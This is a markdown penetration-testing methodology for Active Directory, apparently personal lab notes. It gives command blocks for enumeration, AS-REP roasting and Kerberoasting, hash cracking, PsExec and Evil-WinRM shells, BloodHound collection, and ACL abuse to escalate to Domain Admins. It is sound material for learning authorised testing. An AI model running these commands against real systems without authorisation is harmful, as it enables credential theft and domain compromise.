# Active Directory Penetration Testing Methodology

## 1. Initial Enumeration & Reconnaissance

### Quick Port Scan
Start with a fast SYN scan to identify open ports and services.
```
sudo nmap -Pn -v -sS -sV -sC -oN tcp-quick.nmap <TARGET_IP>
```

Key Ports: 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S), 445 (SMB), 593 (RPC over HTTP)


### RPC Enumeration:
If RPC ports are open, attempt null session enumeration to identify domain users.
```
rpcclient -U "" -N <TARGET_IP>
# Commands inside rpcclient:
# enumdomusers  (List users)
# querydispinfo (List users with descriptions)
```

### LDAP Enumeration:
Run standard Nmap LDAP scripts to extract domain information.
```
sudo nmap -sS -Pn -sV --script=ldap* -p 389,636,3268,3269 <TARGET_IP>
```

### SMB Enumeration:
Check for null sessions and list available shares.
```
nmap --script smb-enum-shares -p 139,445 <TARGET_IP>
```

### SMBClient listing (Null session)
```
smbclient -L \\<TARGET_IP>\ -N
smbclient -m=SMB2 -L \\<HOSTNAME>\ -N
```

## 2. User Enumeration & AS-REP Roasting
### Username List Creation
Compile a list of users found during RPC/SMB enumeration into usernames.txt.
```
./username-anarchy --input-file ./names.txt
```

### Kerbrute Enumeration & Roasting
Use Kerbrute to validate usernames and attempt AS-REP roasting (requesting TGTs for users without Kerberos pre-authentication enabled).
```
kerbrute userenum -d <DOMAIN> --dc <DC_IP> usernames.txt
```

### AS-REP Roasting with Downgrade (If etype 18/AES is unsupported by hashcat/john)
```
kerbrute userenum -d <DOMAIN> --dc <DC_IP> usernames.txt --downgrade
```

### Cracking AS-REP Hashes
If a hash is obtained, crack it using John the Ripper or Hashcat.
```
john hash.txt --wordlist=rockyou.txt
```

## 3. Service Interaction & Lateral Movement
### Credential Validation & Share Spidering
Once credentials (USER:PASS) are obtained, validate them and spider shares for sensitive files.
```
### Validate credentials and list shares
sudo cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares

### Spider shares for interesting files
sudo cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
```

### Remote Execution (PsExec)
Attempt to get a shell via PsExec if the user has appropriate privileges (e.g., local admin).
```
psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

### Remote Management (WinRM)
If the user is part of the Remote Management Users group (or has WinRM enabled), use Evil-WinRM for a stable shell.
```
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

## 4. Post-Exploitation & Privilege Escalation

## BloodHound Enumeration
Gather domain intelligence to identify attack paths (ACLs, group memberships, sessions).
```
### Remote collection via python
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all
```

Tip: If remote collection fails, try uploading the SharpHound collector and running it locally via WinRM.

### Kerberoasting
Search for Service Principal Names (SPNs) associated with user accounts to request TGS tickets and crack them.
```
# Using PowerView (Upload via Evil-WinRM first)
Import-Module .\PowerView.ps1
Get-DomainUser -Identity <TARGET_USER> | Get-DomainSPNTicket -Format Hashcat
```

### ACL Exploitation
Investigate "GenericAll", "WriteDacl", or "GenericWrite" privileges over groups or objects.
 * Tools: aclpwn.py (for automation) or manual PowerView/ActiveDirectory module commands.
 * Attack Vector: If you have write access to a group, add your compromised user to that group (e.g., Exchange Windows Permissions, Account Operators, or Domain Admins).
   
## 5. Lessons Learned / Retrospective
 * Hash Compatibility: Always check encryption types when roasting. If tools reject the hash (krb5asrep18$), force a downgrade to ARCFOUR/RC4.
 * Tool Selection: Running BloodHound via a pivoted session (PsExec) can sometimes yield better results than remote collection if network segmentation or permissions are tricky.
 * Manual vs. Auto: While tools like aclpwn are fast, knowing the manual "one-liner" to edit group membership is crucial for stealth and avoiding dependency issues.
 * Future Research: Deep dive into ACL exploitation (WriteDacl/GenericAll) and object ownership abuse.

